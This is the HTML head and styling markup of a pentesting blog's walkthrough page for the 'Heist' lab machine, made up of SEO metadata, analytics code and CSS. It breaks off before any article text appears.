@@ -1,0 +1,1477 @@
+<html dir="ltr" prefix="og: https://ogp.me/ns#" lang="en-US"><head>
+	
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5, viewport-fit=cover">
+	<link rel="profile" href="https://gmpg.org/xfn/11">
+
+	<title>Proving Grounds – Heist - Walkthrough Write-Up PG Practice</title>
+
+		<!-- All in One SEO 4.2.3.1 -->
+		<meta name="description" content="Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...">
+		<meta name="robots" content="max-image-preview:large">
+		<meta name="google-site-verification" content="94ZH1Bo9OGsgLzvOvY_OUccUzxoar7CElJGaJYQW3X4">
+		<link rel="canonical" href="https://juggernaut-sec.com/proving-grounds-heist/">
+		<meta name="generator" content="All in One SEO (AIOSEO) 4.2.3.1 ">
+		<meta property="og:locale" content="en_US">
+		<meta property="og:site_name" content="Juggernaut Pentesting Blog - A blog to help others achieve their goals in Cyber Security.">
+		<meta property="og:type" content="article">
+		<meta property="og:title" content="Proving Grounds – Heist - Walkthrough Write-Up PG Practice">
+		<meta property="og:description" content="Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...">
+		<meta property="og:url" content="https://juggernaut-sec.com/proving-grounds-heist/">
+		<meta property="og:image" content="https://juggernaut-sec.com/wp-content/uploads/2022/05/heist.jpg">
+		<meta property="og:image:secure_url" content="https://juggernaut-sec.com/wp-content/uploads/2022/05/heist.jpg">
+		<meta property="og:image:width" content="1422">
+		<meta property="og:image:height" content="750">
+		<meta property="article:published_time" content="2022-05-14T19:54:35+00:00">
+		<meta property="article:modified_time" content="2022-07-01T04:27:33+00:00">
+		<meta name="twitter:card" content="summary">
+		<meta name="twitter:site" content="@Juggernaut_Sec">
+		<meta name="twitter:title" content="Proving Grounds – Heist - Walkthrough Write-Up PG Practice">
+		<meta name="twitter:description" content="Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...">
+		<meta name="twitter:creator" content="@Juggernaut_Sec">
+		<meta name="twitter:image" content="https://juggernaut-sec.com/wp-content/uploads/2022/05/heist.jpg">
+		<script type="application/ld+json" class="aioseo-schema">
+			{"@context":"https:\/\/schema.org","@graph":[{"@type":"WebSite","@id":"https:\/\/juggernaut-sec.com\/#website","url":"https:\/\/juggernaut-sec.com\/","name":"Juggernaut Pentesting Blog","description":"A blog to help others achieve their goals in Cyber Security.","inLanguage":"en-US","publisher":{"@id":"https:\/\/juggernaut-sec.com\/#organization"}},{"@type":"Organization","@id":"https:\/\/juggernaut-sec.com\/#organization","name":"juggernaut-sec.com","url":"https:\/\/juggernaut-sec.com\/","logo":{"@type":"ImageObject","@id":"https:\/\/juggernaut-sec.com\/#organizationLogo","url":"https:\/\/juggernaut-sec.com\/wp-content\/uploads\/2022\/03\/juggs.webp","width":856,"height":640},"image":{"@id":"https:\/\/juggernaut-sec.com\/#organizationLogo"},"sameAs":["https:\/\/twitter.com\/Juggernaut_Sec","https:\/\/www.linkedin.com\/in\/justin-barfitt"]},{"@type":"BreadcrumbList","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#breadcrumblist","itemListElement":[{"@type":"ListItem","@id":"https:\/\/juggernaut-sec.com\/#listItem","position":1,"item":{"@type":"WebPage","@id":"https:\/\/juggernaut-sec.com\/","name":"Home","description":"If you want to learn how to hack, then you have come to the right place! Whether you are already working in cyber security, trying to break into cyber, or you are just a hacking hobbyist, then I strongly feel this site has something for you! After successfully completing the OSCP exam...","url":"https:\/\/juggernaut-sec.com\/"},"nextItem":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#listItem"},{"@type":"ListItem","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#listItem","position":2,"item":{"@type":"WebPage","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/","name":"Proving Grounds - Heist","description":"Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...","url":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/"},"previousItem":"https:\/\/juggernaut-sec.com\/#listItem"}]},{"@type":"Person","@id":"https:\/\/juggernaut-sec.com\/author\/thecyberjuggernaut\/#author","url":"https:\/\/juggernaut-sec.com\/author\/thecyberjuggernaut\/","name":"The Cyber Juggernaut","image":{"@type":"ImageObject","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#authorImage","url":"https:\/\/juggernaut-sec.com\/wp-content\/uploads\/2022\/05\/cropped-imageedit_4_5132902636-e1651862568382.png","width":96,"height":96,"caption":"The Cyber Juggernaut"}},{"@type":"WebPage","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#webpage","url":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/","name":"Proving Grounds \u2013 Heist - Walkthrough Write-Up PG Practice","description":"Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...","inLanguage":"en-US","isPartOf":{"@id":"https:\/\/juggernaut-sec.com\/#website"},"breadcrumb":{"@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#breadcrumblist"},"author":"https:\/\/juggernaut-sec.com\/author\/thecyberjuggernaut\/#author","creator":"https:\/\/juggernaut-sec.com\/author\/thecyberjuggernaut\/#author","image":{"@type":"ImageObject","@id":"https:\/\/juggernaut-sec.com\/#mainImage","url":"https:\/\/juggernaut-sec.com\/wp-content\/uploads\/2022\/05\/heist.jpg","width":1422,"height":750},"primaryImageOfPage":{"@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#mainImage"},"datePublished":"2022-05-14T19:54:35+00:00","dateModified":"2022-07-01T04:27:33+00:00"},{"@type":"BlogPosting","@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#blogposting","name":"Proving Grounds \u2013 Heist - Walkthrough Write-Up PG Practice","description":"Proving Grounds Heist walkthrough: SSRF vulnerability, Responder to capture hash, crack the hash with hashcat, foothold with evil-winrm, read gMSA Password...","inLanguage":"en-US","headline":"Proving Grounds - Heist","author":{"@id":"https:\/\/juggernaut-sec.com\/author\/thecyberjuggernaut\/#author"},"publisher":{"@id":"https:\/\/juggernaut-sec.com\/#organization"},"datePublished":"2022-05-14T19:54:35+00:00","dateModified":"2022-07-01T04:27:33+00:00","commentCount":1,"articleSection":"Active Directory, Walkthroughs, bloodhound, bloodhound.py, crackmapexec, evil-winrm, gMSA, gMSA Password, GMSAPasswordReader.exe, hashcat, Hesit, kerbrute, pass-the-hash, PG, PG Practice, Proving Grounds, Responder, seclogon, SeRestore, SeRestoreAbuse.exe, SeRestorePrivilege, Service Account, SSRF, svc_apache, utilman.exe, Visual Studio, Walkthrough","mainEntityOfPage":{"@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#webpage"},"isPartOf":{"@id":"https:\/\/juggernaut-sec.com\/proving-grounds-heist\/#webpage"},"image":{"@type":"ImageObject","@id":"https:\/\/juggernaut-sec.com\/#articleImage","url":"https:\/\/juggernaut-sec.com\/wp-content\/uploads\/2022\/05\/heist.jpg","width":1422,"height":750}}]}
+		</script>
+		<!-- All in One SEO -->
+
+<link rel="dns-prefetch" href="//s.w.org">
+<link rel="alternate" type="application/rss+xml" title="Juggernaut Pentesting Blog » Feed" href="https://juggernaut-sec.com/feed/">
+<link rel="alternate" type="application/rss+xml" title="Juggernaut Pentesting Blog » Comments Feed" href="https://juggernaut-sec.com/comments/feed/">
+<link rel="alternate" type="application/rss+xml" title="Juggernaut Pentesting Blog » Proving Grounds – Heist Comments Feed" href="https://juggernaut-sec.com/proving-grounds-heist/feed/">
+<link rel="stylesheet" id="blocksy-dynamic-global-css" href="https://juggernaut-sec.com/wp-content/uploads/blocksy/css/global.css?ver=09100" media="all">
+<link rel="stylesheet" id="wp-block-library-css" href="https://juggernaut-sec.com/wp-includes/css/dist/block-library/style.min.css?ver=6.0.2" media="all">
+<style id="global-styles-inline-css">
+body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--color--palette-color-1: var(--paletteColor1, #2872fa);--wp--preset--color--palette-color-2: var(--paletteColor2, #1559ed);--wp--preset--color--palette-color-3: var(--paletteColor3, #3A4F66);--wp--preset--color--palette-color-4: var(--paletteColor4, #192a3d);--wp--preset--color--palette-color-5: var(--paletteColor5, #e1e8ed);--wp--preset--color--palette-color-6: var(--paletteColor6, #f2f5f7);--wp--preset--color--palette-color-7: var(--paletteColor7, #FAFBFC);--wp--preset--color--palette-color-8: var(--paletteColor8, #ffffff);--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--gradient--juicy-peach: linear-gradient(to right, #ffecd2 0%, #fcb69f 100%);--wp--preset--gradient--young-passion: linear-gradient(to right, #ff8177 0%, #ff867a 0%, #ff8c7f 21%, #f99185 52%, #cf556c 78%, #b12a5b 100%);--wp--preset--gradient--true-sunset: linear-gradient(to right, #fa709a 0%, #fee140 100%);--wp--preset--gradient--morpheus-den: linear-gradient(to top, #30cfd0 0%, #330867 100%);--wp--preset--gradient--plum-plate: linear-gradient(135deg, #667eea 0%, #764ba2 100%);--wp--preset--gradient--aqua-splash: linear-gradient(15deg, #13547a 0%, #80d0c7 100%);--wp--preset--gradient--love-kiss: linear-gradient(to top, #ff0844 0%, #ffb199 100%);--wp--preset--gradient--new-retrowave: linear-gradient(to top, #3b41c5 0%, #a981bb 49%, #ffc8a9 100%);--wp--preset--gradient--plum-bath: linear-gradient(to top, #cc208e 0%, #6713d2 100%);--wp--preset--gradient--high-flight: linear-gradient(to right, #0acffe 0%, #495aff 100%);--wp--preset--gradient--teen-party: linear-gradient(-225deg, #FF057C 0%, #8D0B93 50%, #321575 100%);--wp--preset--gradient--fabled-sunset: linear-gradient(-225deg, #231557 0%, #44107A 29%, #FF1361 67%, #FFF800 100%);--wp--preset--gradient--arielle-smile: radial-gradient(circle 248px at center, #16d9e3 0%, #30c7ec 47%, #46aef7 100%);--wp--preset--gradient--itmeo-branding: linear-gradient(180deg, #2af598 0%, #009efd 100%);--wp--preset--gradient--deep-blue: linear-gradient(to right, #6a11cb 0%, #2575fc 100%);--wp--preset--gradient--strong-bliss: linear-gradient(to right, #f78ca0 0%, #f9748f 19%, #fd868c 60%, #fe9a8b 100%);--wp--preset--gradient--sweet-period: linear-gradient(to top, #3f51b1 0%, #5a55ae 13%, #7b5fac 25%, #8f6aae 38%, #a86aa4 50%, #cc6b8e 62%, #f18271 75%, #f3a469 87%, #f7c978 100%);--wp--preset--gradient--purple-division: linear-gradient(to top, #7028e4 0%, #e5b2ca 100%);--wp--preset--gradient--cold-evening: linear-gradient(to top, #0c3483 0%, #a2b6df 100%, #6b8cce 100%, #a2b6df 100%);--wp--preset--gradient--mountain-rock: linear-gradient(to right, #868f96 0%, #596164 100%);--wp--preset--gradient--desert-hump: linear-gradient(to top, #c79081 0%, #dfa579 100%);--wp--preset--gradient--ethernal-constance: linear-gradient(to top, #09203f 0%, #537895 100%);--wp--preset--gradient--happy-memories: linear-gradient(-60deg, #ff5858 0%, #f09819 100%);--wp--preset--gradient--grown-early: linear-gradient(to top, #0ba360 0%, #3cba92 100%);--wp--preset--gradient--morning-salad: linear-gradient(-225deg, #B7F8DB 0%, #50A7C2 100%);--wp--preset--gradient--night-call: linear-gradient(-225deg, #AC32E4 0%, #7918F2 48%, #4801FF 100%);--wp--preset--gradient--mind-crawl: linear-gradient(-225deg, #473B7B 0%, #3584A7 51%, #30D2BE 100%);--wp--preset--gradient--angel-care: linear-gradient(-225deg, #FFE29F 0%, #FFA99F 48%, #FF719A 100%);--wp--preset--gradient--juicy-cake: linear-gradient(to top, #e14fad 0%, #f9d423 100%);--wp--preset--gradient--rich-metal: linear-gradient(to right, #d7d2cc 0%, #304352 100%);--wp--preset--gradient--mole-hall: linear-gradient(-20deg, #616161 0%, #9bc5c3 100%);--wp--preset--gradient--cloudy-knoxville: linear-gradient(120deg, #fdfbfb 0%, #ebedee 100%);--wp--preset--gradient--soft-grass: linear-gradient(to top, #c1dfc4 0%, #deecdd 100%);--wp--preset--gradient--saint-petersburg: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);--wp--preset--gradient--everlasting-sky: linear-gradient(135deg, #fdfcfb 0%, #e2d1c3 100%);--wp--preset--gradient--kind-steel: linear-gradient(-20deg, #e9defa 0%, #fbfcdb 100%);--wp--preset--gradient--over-sun: linear-gradient(60deg, #abecd6 0%, #fbed96 100%);--wp--preset--gradient--premium-white: linear-gradient(to top, #d5d4d0 0%, #d5d4d0 1%, #eeeeec 31%, #efeeec 75%, #e9e9e7 100%);--wp--preset--gradient--clean-mirror: linear-gradient(45deg, #93a5cf 0%, #e4efe9 100%);--wp--preset--gradient--wild-apple: linear-gradient(to top, #d299c2 0%, #fef9d7 100%);--wp--preset--gradient--snow-again: linear-gradient(to top, #e6e9f0 0%, #eef1f5 100%);--wp--preset--gradient--confident-cloud: linear-gradient(to top, #dad4ec 0%, #dad4ec 1%, #f3e7e9 100%);--wp--preset--gradient--glass-water: linear-gradient(to top, #dfe9f3 0%, white 100%);--wp--preset--gradient--perfect-white: linear-gradient(-225deg, #E3FDF5 0%, #FFE6FA 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
+</style>
+<link rel="stylesheet" id="ez-icomoon-css" href="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/vendor/icomoon/style.min.css?ver=2.0.31.1" media="all">
+<link rel="stylesheet" id="ez-toc-css" href="https://juggernaut-sec.com/wp-content/plugins/easy-table-of-contents/assets/css/screen.min.css?ver=2.0.31.1" media="all">
+<style id="ez-toc-inline-css">
+div#ez-toc-container p.ez-toc-title {font-size: 125%;}div#ez-toc-container p.ez-toc-title {font-weight: 700;}div#ez-toc-container ul li {font-size: 95%;}div#ez-toc-container nav ul ul li ul li {font-size: 90%!important;}div#ez-toc-container {background: #b7b7b7;border: 1px solid #b7b7b7;}div#ez-toc-container p.ez-toc-title {color: #000000;}div#ez-toc-container ul.ez-toc-list a {color: #000000;}div#ez-toc-container ul.ez-toc-list a:hover {color: #dd3333;}div#ez-toc-container ul.ez-toc-list a:visited {color: #000000;}
+</style>
+<link rel="stylesheet" id="ct-main-styles-css" href="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/main.min.css?ver=1.8.28" media="all">
+<link rel="stylesheet" id="blocksy-ext-cookies-consent-styles-css" href="https://juggernaut-sec.com/wp-content/plugins/blocksy-companion/framework/extensions/cookies-consent/static/bundle/main.min.css?ver=1.8.45" media="all">
+<link rel="stylesheet" id="blocksy-ext-widgets-styles-css" href="https://juggernaut-sec.com/wp-content/plugins/blocksy-companion/framework/extensions/widgets/static/bundle/main.min.css?ver=1.8.45" media="all">
+<link rel="stylesheet" id="ct-page-title-styles-css" href="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/page-title.min.css?ver=1.8.28" media="all">
+<link rel="stylesheet" id="ct-back-to-top-styles-css" href="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/back-to-top.min.css?ver=1.8.28" media="all">
+<link rel="stylesheet" id="ct-wpforms-styles-css" href="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/wpforms.min.css?ver=1.8.28" media="all">
+<link rel="https://api.w.org/" href="https://juggernaut-sec.com/wp-json/"><link rel="alternate" type="application/json" href="https://juggernaut-sec.com/wp-json/wp/v2/posts/1771"><link rel="EditURI" type="application/rsd+xml" title="RSD" href="https://juggernaut-sec.com/xmlrpc.php?rsd">
+<link rel="wlwmanifest" type="application/wlwmanifest+xml" href="https://juggernaut-sec.com/wp-includes/wlwmanifest.xml"> 
+<meta name="generator" content="WordPress 6.0.2">
+<link rel="shortlink" href="https://juggernaut-sec.com/?p=1771">
+<link rel="alternate" type="application/json+oembed" href="https://juggernaut-sec.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fjuggernaut-sec.com%2Fproving-grounds-heist%2F">
+<link rel="alternate" type="text/xml+oembed" href="https://juggernaut-sec.com/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fjuggernaut-sec.com%2Fproving-grounds-heist%2F&amp;format=xml">
+
+		<!-- GA Google Analytics @ https://m0n.co/ga -->
+		<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-KXB635DDTM"></script>
+		<script>
+			window.dataLayer = window.dataLayer || [];
+			function gtag(){dataLayer.push(arguments);}
+			gtag('js', new Date());
+			gtag('config', 'G-KXB635DDTM');
+		</script>
+
+	<noscript><link rel='stylesheet' href='https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/no-scripts.min.css' type='text/css' /></noscript>
+<link rel="icon" href="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-32x32.png" sizes="32x32">
+<link rel="icon" href="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-192x192.png" sizes="192x192">
+<link rel="apple-touch-icon" href="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-180x180.png">
+<meta name="msapplication-TileImage" content="https://juggernaut-sec.com/wp-content/uploads/2022/05/cropped-imageedit_4_5132902636-270x270.png">
+	<script async="" src="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/lazy-load.js"></script><script charset="utf-8" src="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/8.d116d5b553498e021153.js"></script><script charset="utf-8" src="https://juggernaut-sec.com/wp-content/themes/blocksy/static/bundle/6.48db047398a5c890eb67.js"></script></head>
+
+<body class="post-template-default single single-post postid-1771 single-format-standard wp-custom-logo wp-embed-responsive" data-link="type-2" data-prefix="single_blog_post" data-header="type-1" data-footer="type-1:reveal" itemscope="itemscope" itemtype="https://schema.org/Blog">
+
+<a class="skip-link show-on-focus" href="#main">
+	Skip to content</a>
+
+<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0.49803921568627"></feFuncR><feFuncG type="table" tableValues="0 0.49803921568627"></feFuncG><feFuncB type="table" tableValues="0 0.49803921568627"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.54901960784314 0.98823529411765"></feFuncR><feFuncG type="table" tableValues="0 1"></feFuncG><feFuncB type="table" tableValues="0.71764705882353 0.25490196078431"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 1"></feFuncR><feFuncG type="table" tableValues="0 0.27843137254902"></feFuncG><feFuncB type="table" tableValues="0.5921568627451 0.27843137254902"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0 0"></feFuncR><feFuncG type="table" tableValues="0 0.64705882352941"></feFuncG><feFuncB type="table" tableValues="0 1"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite in2="SourceGraphic" operator="in"></feComposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><feColorMatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></feColorMatrix><feComponentTransfer color-interpolation-filters="sRGB"><feFuncR type="table" tableValues="0.78039215686275 1"></feFuncR><feFuncG type="table" tableValues="0 0.94901960784314"></feFuncG><feFuncB type="table" tableValues="0.35294117647059 0.47058823529412"></feFuncB><feFuncA type="table" tableValues="1 1"></feFuncA></feComponentTransfer><feComposite 